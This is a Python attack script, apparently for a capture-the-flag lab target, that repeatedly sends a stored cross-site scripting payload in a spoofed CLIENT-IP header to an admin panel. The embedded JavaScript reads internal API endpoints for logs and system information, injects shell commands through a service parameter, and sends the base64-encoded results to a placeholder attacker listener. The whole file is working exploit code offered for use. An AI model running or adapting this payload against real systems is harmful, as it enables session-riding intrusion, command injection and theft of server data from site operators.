#!/usr/bin/env python3
import requests
import time

TARGET = "http://securedata.htb/admin/admin_panel.php"

HEADERS = {
    "Host": "securedata.htb",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cookie": "session=7b8561bd8d5d3d66",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "CLIENT-IP": """<script>var a='<ATTACKER_listner';function b(s){return btoa(unescape(encodeURIComponent(s)));}function ex(k,v){fetch(a+'/?'+k+'='+encodeURIComponent(b(v)));}fetch('http://api.securedata.htb/fetch_logs').then(r=>r.text()).then(t=>ex('logs',t)).catch(e=>ex('err_logs',e.toString()));fetch('http://api.securedata.htb/fetch_sysinfo').then(r=>r.text()).then(t=>ex('sysinfo',t)).catch(e=>ex('err_sysinfo',e.toString()));['apache2;cat /*.txt;','nginx|ls /'].forEach(function(s){fetch('http://api.securedata.htb/service_status?service='+s).then(r=>r.text()).then(t=>ex('service_'+s,t)).catch(e=>ex('err_service_'+s,e.toString()));});</script>"""

}

DELAY = 3  # seconds between requests

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def main():
    while True:
        try:
            response = requests.get(TARGET, headers=HEADERS, proxies=PROXIES, timeout=10)
            print(f"[{time.strftime('%H:%M:%S')}] Status: {response.status_code} | Length: {len(response.text)}")
        except Exception as e:
            print(f"[{time.strftime('%H:%M:%S')}] Error: {e}")

        time.sleep(DELAY)


if __name__ == "__main__":
    main()
